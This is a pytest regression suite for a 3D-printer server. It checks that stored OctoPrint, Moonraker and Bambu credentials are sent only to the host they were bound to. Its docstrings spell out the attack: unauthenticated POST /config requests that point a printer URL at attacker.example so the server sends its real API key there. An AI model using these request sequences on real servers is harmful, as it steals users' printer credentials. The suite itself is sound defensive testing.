"""A stored printer credential goes to the host it was saved for, and nowhere else.

`POST /config` had no authentication in front of it, and it writes both halves of an
authenticated outbound request: the address and the key. So

    POST /config {"key": "OCTOPRINT_URL", "value": "http://attacker.example/"}
    POST /config/test-connection {"service": "octoprint"}

made this server send `GET http://attacker.example/api/version` carrying the real
`X-Api-Key`. Masking the key in `GET /config` was never a mitigation: the caller does
not read the key, the server delivers it. The same shape reached `MOONRAKER_API_KEY`
and `BAMBU_CODE` at dispatch.

The fix is a binding rather than a check: the host is recorded beside the credential
**at the moment the credential is written**, and the credential is sent only to that
host. Changing the address alone therefore moves nothing; re-saving the key is what
re-binds it, and that is a person deciding about a host they just typed.

Three things are pinned here, on all three credentials:

* the store records and re-records the binding on a write, and drops it on a delete;
* the outbound paths — the connection test, the job's own probe, `subprocess_env`,
  `resolve_printer_target` and the dispatch gate — each honour it;
* the binding itself cannot be written over HTTP, which would be the same hole with
  one more request in it.
"""

import uuid
from datetime import datetime, timezone
from pathlib import Path
from unittest.mock import AsyncMock, patch

import httpx
import pytest
from fastapi.testclient import TestClient

import server.app as app_module
from pythonsrc.telemetry.db import TelemetryDB
from pythonsrc.telemetry.schema import PrintJob
from server.app import app
from server.config_store import (
    INTERNAL_CONFIG_KEYS,
    PRINTER_CREDENTIAL_HOSTS,
    bound_printer_credential,
    credential_host,
)

client = TestClient(app)
REPO_ROOT = Path(__file__).parent.parent
OUTPUTS = REPO_ROOT / "data" / "outputs"

#: Each credential, the address key it is bound through, an address, a *different*
#: address, and the service name `POST /config/test-connection` knows it by. Every
#: behavioural test below runs over this table, because "the same rule for Moonraker
#: and Bambu" is exactly the thing that gets written for OctoPrint and forgotten.
CREDENTIALS = [
    pytest.param(
        "OCTOPRINT_API_KEY", "OCTOPRINT_URL",
        "http://printer.local:5001", "http://attacker.example",
        "octoprint", id="octoprint",
    ),
    pytest.param(
        "MOONRAKER_API_KEY", "MOONRAKER_URL",
        "http://printer.local:7125", "http://attacker.example",
        "moonraker", id="moonraker",
    ),
    pytest.param(
        "BAMBU_CODE", "BAMBU_IP",
        "192.168.1.150", "attacker.example",
        "bambu", id="bambu",
    ),
]


@pytest.fixture(scope="module", autouse=True)
def _config_table():
    """The module-level TestClient never enters its context, so no startup hook runs."""
    app_module.config_store.init_schema()


@pytest.fixture
def store():
    """Write config values for one test and take them out again afterwards.

    The suite shares one schema, so a printer key left behind is what the *next*
    module's `resolve_printer_target` would answer with.
    """
    written = []

    def write(key: str, value: str) -> None:
        app_module.config_store.set(key, value)
        written.append(key)

    yield write

    for key in written:
        app_module.config_store.delete(key)
    for credential_key in PRINTER_CREDENTIAL_HOSTS:
        app_module.config_store.delete(credential_key)


# ── credential_host: what counts as the same host ────────────────────────────

@pytest.mark.parametrize("a,b", [
    ("http://printer.local:5001", "http://printer.local:5001/"),
    ("http://printer.local:5001", "HTTP://Printer.Local:5001/api/version"),
    ("http://printer.local", "http://printer.local:80"),
    ("https://printer.local", "https://printer.local:443"),
    ("192.168.1.150", "192.168.1.150/"),
])
def test_the_same_machine_is_one_host(a, b):
    """A trailing slash or a redundant default port must not cost a re-typed key."""
    assert credential_host(a) == credential_host(b)


@pytest.mark.parametrize("a,b", [
    ("http://printer.local:5001", "http://attacker.example:5001"),
    ("http://printer.local:5001", "http://printer.local:5002"),
    # A scheme change is a different destination for the secret's purposes: https to
    # http is the same key travelling in clear.
    ("https://printer.local", "http://printer.local"),
    ("192.168.1.150", "192.168.1.151"),
    # Userinfo is not a host, and must not be a way to smuggle one past a comparison.
    ("http://printer.local@attacker.example", "http://printer.local"),
])
def test_a_different_machine_is_a_different_host(a, b):
    assert credential_host(a) != credential_host(b)


@pytest.mark.parametrize("value", [None, "", "   "])
def test_nothing_configured_is_no_host(value):
    assert credential_host(value) is None


# ── The store records the binding on the write ───────────────────────────────

@pytest.mark.parametrize("credential_key,url_key,url,other_url,service", CREDENTIALS)
def test_saving_a_credential_binds_it_to_the_address_of_the_moment(
    store, credential_key, url_key, url, other_url, service,
):
    host_key = PRINTER_CREDENTIAL_HOSTS[credential_key][0]
    store(url_key, url)
    store(credential_key, "the-real-key")

    assert app_module.config_store.get(host_key) == credential_host(url)
    assert app_module.config_store.bound_credential(credential_key).value == "the-real-key"


@pytest.mark.parametrize("credential_key,url_key,url,other_url,service", CREDENTIALS)
def test_changing_the_address_alone_does_not_move_the_key(
    store, credential_key, url_key, url, other_url, service,
):
    """The whole issue, at the level of the store."""
    store(url_key, url)
    store(credential_key, "the-real-key")
    store(url_key, other_url)

    bound = app_module.config_store.bound_credential(credential_key)
    assert bound.value is None
    assert bound.stored is True
    assert bound.withheld is True
    assert bound.bound_host == credential_host(url)
    assert bound.target_host == credential_host(other_url)
    assert url_key in bound.reason and "re-enter" in bound.reason


@pytest.mark.parametrize("credential_key,url_key,url,other_url,service", CREDENTIALS)
def test_re_saving_the_key_re_binds_it(
    store, credential_key, url_key, url, other_url, service,
):
    store(url_key, url)
    store(credential_key, "the-real-key")
    store(url_key, other_url)
    assert app_module.config_store.bound_credential(credential_key).value is None

    store(credential_key, "the-real-key")

    bound = app_module.config_store.bound_credential(credential_key)
    assert bound.value == "the-real-key"
    assert bound.bound_host == credential_host(other_url)
    assert bound.reason is None


@pytest.mark.parametrize("credential_key,url_key,url,other_url,service", CREDENTIALS)
def test_a_key_saved_with_no_address_is_bound_to_nothing(
    store, credential_key, url_key, url, other_url, service,
):
    """Saving the key first and the address second leaves the key unbound.

    Deliberately: an address written after the key is an address the key's owner
    never saw. It costs one re-save, and the message says so.
    """
    store(credential_key, "the-real-key")
    store(url_key, url)

    bound = app_module.config_store.bound_credential(credential_key)
    assert bound.value is None
    assert bound.bound_host is None
    assert "not bound" in bound.reason


@pytest.mark.parametrize("credential_key,url_key,url,other_url,service", CREDENTIALS)
def test_deleting_the_credential_deletes_its_binding(
    store, credential_key, url_key, url, other_url, service,
):
    host_key = PRINTER_CREDENTIAL_HOSTS[credential_key][0]
    store(url_key, url)
    store(credential_key, "the-real-key")

    app_module.config_store.delete(credential_key)
    assert app_module.config_store.get(host_key) is None


# ── The binding cannot be written over HTTP ──────────────────────────────────

@pytest.mark.parametrize("host_key", sorted(INTERNAL_CONFIG_KEYS))
def test_a_host_binding_is_not_settable_over_http(host_key):
    """One more request must not be enough to re-point the key at a chosen host."""
    resp = client.post("/config", json={"key": host_key, "value": "http://attacker.example"})
    assert resp.status_code == 400
    assert client.delete(f"/config/{host_key}").status_code == 400
    assert client.get(f"/config/{host_key}/reveal").status_code == 400


def test_the_bindings_are_not_listed_as_settings():
    """Store bookkeeping, not a field anyone fills in."""
    body = client.get("/config").json()
    assert not (set(body) & INTERNAL_CONFIG_KEYS)


@pytest.mark.parametrize("credential_key,url_key,url,other_url,service", CREDENTIALS)
def test_get_config_reports_the_binding_state(
    store, credential_key, url_key, url, other_url, service,
):
    """Settings can say "key bound to host X", which is why the extra step is fair."""
    store(url_key, url)
    store(credential_key, "the-real-key")

    binding = client.get("/config").json()[credential_key]["host_binding"]
    assert binding["sends"] is True
    assert binding["bound_to"] == credential_host(url)
    assert binding["message"] is None

    store(url_key, other_url)
    binding = client.get("/config").json()[credential_key]["host_binding"]
    assert binding["sends"] is False
    assert binding["bound_to"] == credential_host(url)
    assert binding["target"] == credential_host(other_url)
    assert "re-enter" in binding["message"]


def test_a_key_with_no_binding_to_explain_carries_none():
    assert client.get("/config").json()["HF_TOKEN"]["host_binding"] is None


# ── test-connection ──────────────────────────────────────────────────────────

class _Captured:
    """The headers the probe went out with, or None when it never went out."""

    def __init__(self):
        self.headers = None

    def install(self, monkeypatch, status_code=200):
        captured = self

        class _Response:
            status_code = 200
            text = "{}"

            def raise_for_status(self):
                return None

            def json(self):
                return {}

        async def fake_get(self, url, **kwargs):  # noqa: ANN001 - httpx's own signature
            captured.headers = dict(kwargs.get("headers") or {})
            return _Response()

        monkeypatch.setattr(httpx.AsyncClient, "get", fake_get)


@pytest.fixture
def probe(monkeypatch):
    captured = _Captured()
    captured.install(monkeypatch)
    return captured


def test_test_connection_sends_a_bound_octoprint_key(store, probe):
    store("OCTOPRINT_URL", "http://printer.local:5001")
    store("OCTOPRINT_API_KEY", "the-real-key")

    body = client.post("/config/test-connection", json={"service": "octoprint"}).json()

    assert body["success"] is True
    assert probe.headers["X-Api-Key"] == "the-real-key"


def test_test_connection_withholds_the_key_from_a_changed_octoprint_url(store, probe):
    """The acceptance criterion, exactly: probed, keyless, and said so."""
    store("OCTOPRINT_URL", "http://printer.local:5001")
    store("OCTOPRINT_API_KEY", "the-real-key")
    store("OCTOPRINT_URL", "http://attacker.example")

    body = client.post("/config/test-connection", json={"service": "octoprint"}).json()

    assert probe.headers is not None, "the probe must still run, keylessly"
    assert "X-Api-Key" not in probe.headers
    assert "the-real-key" not in str(probe.headers)
    assert "OCTOPRINT_URL changed since the key was saved" in body["message"]
    assert "re-enter the key to send it to the new host" in body["message"]


def test_re_saving_the_octoprint_key_sends_it_again(store, probe):
    store("OCTOPRINT_URL", "http://printer.local:5001")
    store("OCTOPRINT_API_KEY", "the-real-key")
    store("OCTOPRINT_URL", "http://attacker.example")
    client.post("/config/test-connection", json={"service": "octoprint"})
    assert "X-Api-Key" not in probe.headers

    store("OCTOPRINT_API_KEY", "the-real-key")
    body = client.post("/config/test-connection", json={"service": "octoprint"}).json()

    assert probe.headers["X-Api-Key"] == "the-real-key"
    assert body["success"] is True
    assert "re-enter" not in body["message"]


def test_test_connection_withholds_the_key_from_a_changed_moonraker_url(store, probe):
    store("MOONRAKER_URL", "http://printer.local:7125")
    store("MOONRAKER_API_KEY", "the-real-key")
    assert client.post("/config/test-connection", json={"service": "moonraker"}).json()
    assert probe.headers["X-Api-Key"] == "the-real-key"

    store("MOONRAKER_URL", "http://attacker.example")
    body = client.post("/config/test-connection", json={"service": "klipper"}).json()

    assert probe.headers is not None
    assert "X-Api-Key" not in probe.headers
    assert "MOONRAKER_URL changed since the key was saved" in body["message"]


def test_test_connection_refuses_a_bambu_code_bound_elsewhere(store, monkeypatch):
    """Nothing is sent on the Bambu probe, so the answer is the binding itself.

    A TCP connect to 8883 cannot carry the access code, so there is no keyless
    version of this probe worth making — the code cannot authenticate a print to
    this address, and that is the whole answer.
    """
    connected = []

    async def fake_open_connection(host, port):
        connected.append((host, port))
        raise AssertionError("the probe must not run for a code bound elsewhere")

    store("BAMBU_IP", "192.168.1.150")
    store("BAMBU_CODE", "the-real-code")
    store("BAMBU_IP", "attacker.example")
    monkeypatch.setattr(app_module.asyncio, "open_connection", fake_open_connection)

    body = client.post("/config/test-connection", json={"service": "bambu"}).json()

    assert body["success"] is False
    assert "BAMBU_IP changed since the key was saved" in body["message"]
    assert connected == []


# ── resolve_printer_target and subprocess_env ────────────────────────────────

@pytest.mark.parametrize("credential_key,url_key,url,other_url,service", CREDENTIALS)
def test_resolve_printer_target_withholds_a_key_bound_elsewhere(
    store, credential_key, url_key, url, other_url, service,
):
    """The pipeline's `DS_PRINTER_KEY` comes from here, for all three firmwares."""
    firmware = {"octoprint": "octoprint", "moonraker": "klipper", "bambu": "bambu"}[service]
    store("DEFAULT_PRINTER_FIRMWARE", firmware)
    store(url_key, url)
    store(credential_key, "the-real-key")

    assert app_module.resolve_printer_target()[2] == "the-real-key"

    store(url_key, other_url)
    resolved_firmware, base_url, api_key = app_module.resolve_printer_target()
    assert resolved_firmware == firmware
    assert base_url == other_url
    assert api_key is None


def test_a_profile_key_is_never_paired_with_a_stored_address(store, tmp_path):
    """A profile's own credential belongs to the profile's own address.

    `pythonsrc/profiles/bambu_test.json` used to carry an `api_key`, and the store's
    address is settable by an unauthenticated request — so pairing the two was the
    same confused deputy by another route, with the key coming off disk. That file was
    deleted in #73 and no bundled profile carries a credential now
    (`test_no_bundled_profile_carries_a_connection_secret`), but the rule is about the
    shape rather than about that file: a profile is a place a key *can* be written, so
    this builds one and checks the pairing directly.
    """
    profile = tmp_path / "profile.json"
    profile.write_text(
        '{"firmware": "octoprint", "base_url": "http://profile.local:5001", '
        '"api_key": "from-the-profile"}'
    )

    # No stored address: the profile is the whole target, and its key goes with it.
    assert app_module.resolve_printer_target(str(profile))[1:] == (
        "http://profile.local:5001", "from-the-profile",
    )

    store("OCTOPRINT_URL", "http://attacker.example")
    assert app_module.resolve_printer_target(str(profile))[1:] == (
        "http://attacker.example", None,
    )


def test_subprocess_env_withholds_a_key_bound_elsewhere(store):
    """`OCTOPRINT_API_KEY` is on the allowlist, which was the other way out."""
    store("OCTOPRINT_URL", "http://printer.local:5001")
    store("OCTOPRINT_API_KEY", "the-real-key")
    assert app_module.subprocess_env(base={})["OCTOPRINT_API_KEY"] == "the-real-key"

    store("OCTOPRINT_URL", "http://attacker.example")
    env = app_module.subprocess_env(base={})
    assert "OCTOPRINT_API_KEY" not in env
    assert env["OCTOPRINT_URL"] == "http://attacker.example"


def test_subprocess_env_never_inherits_a_printer_credential(store):
    """A key this process was started with was never bound to anything.

    `subprocess_env` starts from `os.environ`, and `OCTOPRINT_API_KEY` is documented
    in `.env.template` and loaded into every compose service by `env_file`. The store
    was therefore not the only way a key reached a child: with no key *stored*, the
    binding had nothing to withhold, the inherited one was never overwritten, and the
    address it got paired with was still the store's — which is the whole confused
    deputy, with the key coming from `.env` instead of from the database.
    """
    store("OCTOPRINT_URL", "http://attacker.example")

    env = app_module.subprocess_env(base={"OCTOPRINT_API_KEY": "from-dot-env"})

    assert "OCTOPRINT_API_KEY" not in env
    assert env["OCTOPRINT_URL"] == "http://attacker.example"


def test_subprocess_env_drops_an_inherited_key_when_the_stored_one_is_withheld(store):
    """Withholding has to *remove*, not merely decline to set."""
    store("OCTOPRINT_URL", "http://printer.local:5001")
    store("OCTOPRINT_API_KEY", "the-real-key")
    store("OCTOPRINT_URL", "http://attacker.example")

    env = app_module.subprocess_env(base={"OCTOPRINT_API_KEY": "from-dot-env"})

    assert "OCTOPRINT_API_KEY" not in env


def test_subprocess_env_still_forwards_a_bound_key_over_an_inherited_one(store):
    """The store wins when it has an answer; this is the path that must keep working."""
    store("OCTOPRINT_URL", "http://printer.local:5001")
    store("OCTOPRINT_API_KEY", "the-real-key")

    env = app_module.subprocess_env(base={"OCTOPRINT_API_KEY": "from-dot-env"})

    assert env["OCTOPRINT_API_KEY"] == "the-real-key"


# ── The dispatch gate ────────────────────────────────────────────────────────

#: The bundled profile each firmware is dispatched through. The *profile* names the
#: firmware and wins over `DEFAULT_PRINTER_FIRMWARE`, so the gate is only reached for
#: Moonraker or Bambu by way of one of these.
PROFILE_FOR_SERVICE = {
    "octoprint": "pythonsrc/profiles/ender3.json",
    "moonraker": "pythonsrc/profiles/klipper_test.json",
    "bambu": "pythonsrc/profiles/bambu_p1s.json",
}


@pytest.fixture
def sliced_job():
    """Make a job with G-code, sitting at the confirmation step."""
    made = []

    def build(profile_name: str = "pythonsrc/profiles/ender3.json") -> str:
        job_id = str(uuid.uuid4())
        db = TelemetryDB()
        db.init_schema()
        db.insert_job(
            PrintJob(
                job_id=job_id,
                prompt="a vase",
                printer_id="default_printer",
                printer_firmware="octoprint",
                slicer="cura",
                profile_name=profile_name,
                started_at=datetime.now(timezone.utc),
                completed_at=None,
                outcome="unknown",
            )
        )
        db.update_job_slice(job_id, status="success")
        db.close()

        directory = OUTPUTS / job_id
        directory.mkdir(parents=True, exist_ok=True)
        (directory / "engineered_mesh.gcode").write_text(";TIME:600\nG1 X1 Y1 E0.1\n")
        made.append(directory)
        return job_id

    yield build

    for directory in made:
        for f in directory.iterdir():
            f.unlink()
        directory.rmdir()


@pytest.mark.parametrize("credential_key,url_key,url,other_url,service", CREDENTIALS)
def test_the_dispatch_gate_refuses_a_key_bound_elsewhere(
    sliced_job, printer_configured, store,
    credential_key, url_key, url, other_url, service,
):
    """No operator is launched, and the refusal says what to do about it."""
    job_id = sliced_job(PROFILE_FOR_SERVICE[service])
    store(url_key, url)
    store(credential_key, "the-real-key")
    store(url_key, other_url)

    launched = []

    async def fake_exec(*cmd, **kwargs):
        launched.append(cmd)
        return AsyncMock(returncode=0)

    with patch("asyncio.create_subprocess_exec", new=fake_exec), \
         patch("server.app._stream_output", new=AsyncMock()):
        resp = client.post(f"/jobs/{job_id}/print-dispatch", json={"confirmed": True})

    assert resp.status_code == 409, resp.text
    assert url_key in resp.json()["detail"]
    assert "re-enter" in resp.json()["detail"]
    assert launched == [], "nothing may be sent to a printer the key is not bound to"


def test_the_dispatch_gate_passes_once_the_key_is_re_saved(
    sliced_job, printer_configured, store,
):
    job_id = sliced_job()
    store("OCTOPRINT_URL", "http://printer.local:5001")
    store("OCTOPRINT_API_KEY", "the-real-key")
    store("OCTOPRINT_URL", "http://printer.local:5002")
    assert client.post(
        f"/jobs/{job_id}/print-dispatch", json={"confirmed": True}
    ).status_code == 409

    store("OCTOPRINT_API_KEY", "the-real-key")

    captured = {}

    async def fake_exec(*cmd, **kwargs):
        captured["env"] = kwargs.get("env")
        return AsyncMock(returncode=0)

    with patch("asyncio.create_subprocess_exec", new=fake_exec), \
         patch("server.app._stream_output", new=AsyncMock()):
        resp = client.post(f"/jobs/{job_id}/print-dispatch", json={"confirmed": True})

    assert resp.status_code == 200, resp.text
    assert captured["env"]["DS_PRINTER_KEY"] == "the-real-key"
    assert captured["env"]["DS_FIRMWARE"] == "octoprint"


def test_the_operator_is_never_handed_a_key_for_another_firmware(
    sliced_job, printer_configured, store,
):
    """The sixth outbound path: the operator subprocess.

    The dispatch gate asks `printer_credential(target["firmware"])`, so a klipper
    profile is gated on `MOONRAKER_API_KEY` — and with none stored, that gate passes.
    What then went out was `subprocess_env`'s `OCTOPRINT_API_KEY`, which the store had
    checked against `OCTOPRINT_URL`, beside an `OCTOPRINT_URL` the dispatch block had
    just overwritten with `MOONRAKER_URL`. `run_operator.py` pairs exactly those two,
    so the OctoPrint key left for the Moonraker address:

        POST /config {"key": "MOONRAKER_URL", "value": "http://attacker.example"}
        POST /config {"key": "DEFAULT_PROFILE", "value": ".../klipper_test.json"}
        POST /jobs/{id}/print-dispatch {"confirmed": true}

    Both writes are unauthenticated, and the key is one the person bound to their own
    printer and never re-entered.
    """
    job_id = sliced_job(PROFILE_FOR_SERVICE["moonraker"])
    store("OCTOPRINT_URL", "http://printer.local:5001")
    store("OCTOPRINT_API_KEY", "the-real-key")
    store("MOONRAKER_URL", "http://attacker.example")

    captured = {}

    async def fake_exec(*cmd, **kwargs):
        captured["env"] = kwargs.get("env")
        return AsyncMock(returncode=0)

    with patch("asyncio.create_subprocess_exec", new=fake_exec), \
         patch("server.app._stream_output", new=AsyncMock()):
        resp = client.post(f"/jobs/{job_id}/print-dispatch", json={"confirmed": True})

    assert resp.status_code == 200, resp.text
    env = captured["env"]
    assert "the-real-key" not in env.values(), (
        "the OctoPrint key must not reach an operator dispatching to Moonraker"
    )
    assert env["DS_FIRMWARE"] == "klipper"
    assert "DS_PRINTER_KEY" not in env


def test_the_operator_does_not_inherit_a_dot_env_key(
    sliced_job, printer_configured, store, monkeypatch,
):
    """The same leak with the key coming from `.env` rather than from the store.

    Nothing is stored, so the binding has nothing to withhold and the gate passes —
    and `subprocess_env` starts from this process's environment, which compose fills
    from `.env` for every service.
    """
    job_id = sliced_job()
    monkeypatch.setenv("OCTOPRINT_API_KEY", "from-dot-env")
    store("OCTOPRINT_URL", "http://attacker.example")

    captured = {}

    async def fake_exec(*cmd, **kwargs):
        captured["env"] = kwargs.get("env")
        return AsyncMock(returncode=0)

    with patch("asyncio.create_subprocess_exec", new=fake_exec), \
         patch("server.app._stream_output", new=AsyncMock()):
        resp = client.post(f"/jobs/{job_id}/print-dispatch", json={"confirmed": True})

    assert resp.status_code == 200, resp.text
    assert "from-dot-env" not in captured["env"].values()


# ── The rule itself, read off a plain mapping ────────────────────────────────

def test_bound_printer_credential_reads_an_already_loaded_store():
    """`get_all` callers must get the same answer as `get` callers, or there are two."""
    stored = {
        "OCTOPRINT_URL": "http://printer.local:5001/",
        "OCTOPRINT_API_KEY": "the-real-key",
        "OCTOPRINT_API_KEY_HOST": "http://printer.local:5001",
    }
    assert bound_printer_credential("OCTOPRINT_API_KEY", stored.get).value == "the-real-key"

    stored["OCTOPRINT_URL"] = "http://attacker.example"
    assert bound_printer_credential("OCTOPRINT_API_KEY", stored.get).value is None


def test_no_credential_is_not_a_withheld_one():
    """"Never saved" and "saved, not sendable" must stay different states."""
    stored = {"OCTOPRINT_URL": "http://printer.local:5001"}
    bound = bound_printer_credential("OCTOPRINT_API_KEY", stored.get)
    assert bound.stored is False
    assert bound.withheld is False
    assert bound.reason is None


# ── The operator's own pairing ───────────────────────────────────────────────

def test_the_operator_takes_the_key_the_server_resolved_for_the_firmware():
    """`DS_PRINTER_KEY`, not `OCTOPRINT_API_KEY`.

    The server has already asked `printer_credential(firmware)`; reading a key named
    after one firmware and pairing it with an address resolved for another is the
    mismatch the binding cannot see, because by then both halves look like ordinary
    environment variables.
    """
    from pythonsrc.run_operator import printer_from_env

    profile = {"firmware": "klipper", "base_url": "http://localhost:7125", "api_key": None}
    assert printer_from_env(profile, {
        "DS_FIRMWARE": "klipper",
        "DS_PRINTER_URL": "http://printer.local:7125",
        "DS_PRINTER_KEY": "the-moonraker-key",
        "OCTOPRINT_API_KEY": "the-octoprint-key",
        "OCTOPRINT_URL": "http://attacker.example",
    }) == ("klipper", "http://printer.local:7125", "the-moonraker-key")


def test_the_operator_sends_no_key_when_the_server_withheld_one():
    """A resolved address with no resolved key is a keyless dispatch, not a fallback."""
    from pythonsrc.run_operator import printer_from_env

    profile = {"firmware": "klipper", "base_url": "http://localhost:7125", "api_key": None}
    assert printer_from_env(profile, {
        "DS_FIRMWARE": "klipper",
        "DS_PRINTER_URL": "http://attacker.example",
        "OCTOPRINT_API_KEY": "the-octoprint-key",
    }) == ("klipper", "http://attacker.example", None)


def test_a_profile_key_travels_only_with_the_profiles_own_address():
    """`resolve_printer_target`'s rule, which has to hold on this side too.

    `pythonsrc/profiles/bambu_test.json` used to carry an `api_key`; it was deleted in
    #73 and no bundled profile carries a credential now. The store's address is still
    settable by an unauthenticated request and a profile is still a file on disk, so
    the rule stands on its own and the dict below supplies the shape.
    """
    from pythonsrc.run_operator import printer_from_env

    profile = {"firmware": "bambu", "base_url": "192.168.1.100", "api_key": "123456"}

    # No address resolved by the server: the profile is the whole target.
    assert printer_from_env(profile, {}) == ("bambu", "192.168.1.100", "123456")

    # An address the server resolved: the profile's key stays behind.
    assert printer_from_env(profile, {
        "DS_FIRMWARE": "bambu", "DS_PRINTER_URL": "attacker.example",
    }) == ("bambu", "attacker.example", None)
